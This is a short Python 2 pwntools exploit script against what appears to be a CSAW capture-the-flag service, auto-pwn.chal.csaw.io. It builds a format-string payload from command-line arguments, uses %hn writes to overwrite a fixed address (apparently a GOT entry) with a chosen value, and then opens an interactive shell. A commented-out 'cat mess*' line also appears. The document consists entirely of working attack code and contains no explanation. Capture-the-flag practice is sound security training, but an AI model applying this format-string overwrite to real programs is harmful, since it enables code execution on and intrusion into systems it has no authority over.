from pwn import *
import sys
ex = 0x804E028
h = 'auto-pwn.chal.csaw.io'
p = sys.argv[2]
sh = remote(h,p)
pas = sys.argv[1]
# context.log_level = "debug"
# elf = ELF(filename)
add = int(sys.argv[3],16)
w = (add&0xffff0000)>>16
n = (add&0xffff)
exp = "AA"+p32(ex+2)+p32(ex)+"%"+ str(w-10) +"c%6$hn%"+ str(n-w) +"c%7$hn"
print exp
sh.sendline(pas)
# sh.recvuntil("will generate a report!!")
sh.sendline(exp)
# sh.sendline("cat mess*")
# sh.close()
sh.interactive()